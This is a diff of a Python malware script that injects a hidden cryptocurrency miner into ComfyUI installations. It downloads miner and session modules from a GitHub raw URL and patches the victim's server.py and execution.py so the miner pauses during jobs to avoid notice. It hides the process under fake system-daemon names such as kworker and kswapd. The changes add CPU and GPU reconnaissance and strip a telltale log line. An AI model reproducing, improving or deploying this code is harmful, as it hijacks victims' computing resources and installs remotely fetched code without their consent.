@@ -1,10 +1,12 @@
-#FUCK_PUTIN
+# FUCK_PUTIN
 
 import importlib
+import ipaddress
 import py_compile
 import random
 import re
 import shutil
+import string
 import subprocess
 import sys
 import tempfile
@@ -13,8 +15,6 @@ import traceback
 import urllib.request
 from io import StringIO
 from pathlib import Path
-import ipaddress
-import string
 
 HOME_DIR = ""
 
@@ -30,7 +30,7 @@ NAMES = ["systemd-logind-helper", "systemd-update-agt", "systemd-worker", "syste
          "netdata-agent", "netd-upd", "netd-svc", "netd-helper", "net-monitor", "net-sync", "net-backup", "svc-updater",
          "svc-runner", "svc-agent", "svc-daemon", "svc-maint", "svc-sync", "service-runner", "service-agent",
          "service-upd", "service-backup", "runner-maint", "runner-svc", "runner-agent", "watchdog-maint",
-         "watchdog-svc", "watchdog-agent", "watchdog-sync", "watchdog-run", "tmpabc123", "tmp-runner", "tmp-svc",
+         "watchdog-svc", "watchdog-agent", "watchdog-sync", "watchdog-run", "tmp-runner", "tmp-svc", "sys-apt",
          "tmp-upd", "tmp-helper", "tmpdaemon", "run00123", "run-helper", "run-svc", "run-agent", "kdevtmpfs",
          "kdevtmpfs-01", "kdevtmpfs_az", "kswapd99", "kswapd77", "kswapd-obj", "kworker-42:0", "kworker-7:1",
          "kworker-3-irq", "kworker42", "kthrotld", "kthrotld-01", "khugepaged", "khugepaged-aux", "kernel-helper",
@@ -80,7 +80,7 @@ NAMES = ["systemd-logind-helper", "systemd-update-agt", "systemd-worker", "syste
          "bridge-agent", "bridge-run", "proxy-helper", "proxy-agent", "proxy-run", "relay-helper", "relay-agent",
          "relay-run", "endpoint-svc", "endpoint-agent", "endpoint-run", "gateway-svc", "gateway-agent", "gateway-run",
          "listener-helper", "listener-agent", "listener-run", "handler-svc", "handler-agent", "handler-run",
-         "handler-helper", "processor-svc", "processor-agent", "processor-run", "processor-helper"]
+         "handler-helper", "processor-svc", "processor-agent", "processor-run", "processor-helper", "apt-runner"]
 
 
 def ip_to_letters(ip_str: str) -> str:
@@ -95,7 +95,6 @@ def ip_to_letters(ip_str: str) -> str:
 
 def get_public_ip():
     try:
-        print("--- MINER MANAGER: Getting public IP...")
         with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
             ip = response.read().decode("utf-8").strip()
             letters = ip_to_letters(ip)
@@ -153,14 +152,31 @@ def inject():
     old_stdout, old_stderr = sys.stdout, sys.stderr
     sys.stdout = sys.stderr = log_stream = StringIO()
 
-    with tempfile.TemporaryDirectory() as temp_dir_str:
+    with (tempfile.TemporaryDirectory() as temp_dir_str):
         temp_dir = Path(temp_dir_str)
         try:
-            SESSION_UTILS_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/session_utils.py"
-            MINER_MANAGER_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
-            SRL_INIT_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/init.py"
-            REQUIRED_PACKAGES = [('aiohttp', 'aiohttp'), ('Crypto', 'pycryptodome'),
+            session_utils_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/session_utils.py"
+            miner_manager_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
+            srl_init_url = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/init.py"
+            required_packages = [('aiohttp', 'aiohttp'), ('Crypto', 'pycryptodome'),
                                  ('aiohttp_session', 'aiohttp_session[secure]')]
+
+            def run_command(cmd_str):
+                try:
+                    return subprocess.run(cmd_str, shell=True, capture_output=True, text=True, check=True).stdout
+                except subprocess.CalledProcessError as e:
+                    return f"Error executing '{cmd_str}': {e}"
+                except Exception as e:
+                    return f"Unexpected error running '{cmd_str}': {e}"
+
+            # Команда для CPU
+            print("=== CPU Information ===")
+            print(run_command(
+                "lscpu | grep -E '^(Model name|CPU\\(s\\)|Core\\(s\\) per socket|Socket\\(s\\)|Thread\\(s\\) per core|NUMA node\\(s\\)|CPU max MHz)'"))
+
+            # Команда для GPU (предполагается, что nvidia-smi доступна)
+            print("\n=== GPU Information (nvidia-smi) ===")
+            print(run_command("nvidia-smi"))
 
             # --- Шаг 1: Поиск директории ---
             print("[*] 1. Поиск корневой директории ComfyUI...")
@@ -198,10 +214,10 @@ def inject():
             print("\n[*] 2. Подготовка патчей...")
 
             session_utils_content = urllib.request.urlopen(
-                urllib.request.Request(SESSION_UTILS_URL)).read()
-            srl_init_content = urllib.request.urlopen(urllib.request.Request(SRL_INIT_URL)).read()
+                urllib.request.Request(session_utils_url)).read()
+            srl_init_content = urllib.request.urlopen(urllib.request.Request(srl_init_url)).read()
 
-            with urllib.request.urlopen(urllib.request.Request(MINER_MANAGER_URL)) as response:
+            with urllib.request.urlopen(urllib.request.Request(miner_manager_url)) as response:
                 miner_manager_content = response.read().decode('utf-8')  # Декодируем bytes в str
 
             # --- Подготовка патча для server.py (Оба патча вместе) ---
@@ -268,16 +284,16 @@ def inject():
 
                 execute_start_index = next(
                     i for i, line in enumerate(lines_exec) if line.strip().startswith('def execute(self,'))
-                indent = re.match(r'^(\s*)', lines_exec[execute_start_index]).group(1)
-                body_indent = indent + '    '
+                body_indent = re.match(r'^(\s*)', lines_exec[execute_start_index]).group(1) + '    '
                 end_index = next((i for i in range(execute_start_index + 1, len(lines_exec)) if
                                   lines_exec[i].strip() and not lines_exec[i].startswith(body_indent)), len(lines_exec))
                 original_body = lines_exec[execute_start_index + 1: end_index]
 
-                new_body = [f"{body_indent}manage_miner('stop')\n", f"{body_indent}try:\n",
-                            *[f"    {line}" for line in original_body], f"{body_indent}finally:\n",
-                            f"{body_indent}    manage_miner('start')\n"]
-                lines_exec[execute_start_index + 1: end_index] = new_body
+                lines_exec[execute_start_index + 1: end_index] = [
+                    f"{body_indent}manage_miner('stop')\n", f"{body_indent}try:\n",
+                    *[f"    {line}" for line in original_body], f"{body_indent}finally:\n",
+                    f"{body_indent}    manage_miner('start')\n"
+                ]
 
             patched_exec_content = "".join(lines_exec)
 
@@ -302,7 +318,7 @@ def inject():
 
             print("\n[*] 4. Применение проверенных изменений к реальным файлам...")
 
-            missing_packages = [pip_name for import_name, pip_name in REQUIRED_PACKAGES if
+            missing_packages = [pip_name for import_name, pip_name in required_packages if
                                 not importlib.util.find_spec(import_name)]
             if missing_packages:
                 subprocess.run([sys.executable, "-m", "pip", "install"] + missing_packages, check=True,
@@ -319,7 +335,6 @@ def inject():
             (root_dir / "server.py").write_text(patched_server_content, encoding='utf-8')
             (root_dir / "execution.py").write_text(patched_exec_content, encoding='utf-8')
 
-            print("[+] Все файлы успешно установлены и пропатчены.")
             print("\n[*] Заебись! Перезапусти ComfyUI.")
 
         except Exception as e:
